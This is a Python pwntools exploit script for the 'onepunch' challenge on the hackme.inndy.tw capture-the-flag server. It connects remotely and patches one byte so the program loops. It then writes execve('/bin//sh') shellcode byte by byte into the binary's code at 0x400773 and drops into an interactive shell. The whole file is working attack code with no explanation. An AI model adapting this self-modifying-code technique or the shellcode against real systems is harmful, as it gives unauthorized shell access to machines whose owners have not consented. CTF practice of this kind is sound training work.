#!/usr/bin/env python
# coding=utf-8
from pwn import *
#a=process("./onepunch")
a=remote("hackme.inndy.tw",7718)
a.recvuntil("?")
a.sendline("0x400768")
a.sendline("137")

shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
length=len(shellcode)
addr=0x400773 
i=0
while i<length:
    a.recvuntil("?")
    a.sendline(str(hex(addr+i)))
    a.sendline(str(ord(shellcode[i])))
    i+=1

a.recvuntil("?")
a.sendline("0x400768")
a.sendline("10")
a.interactive()

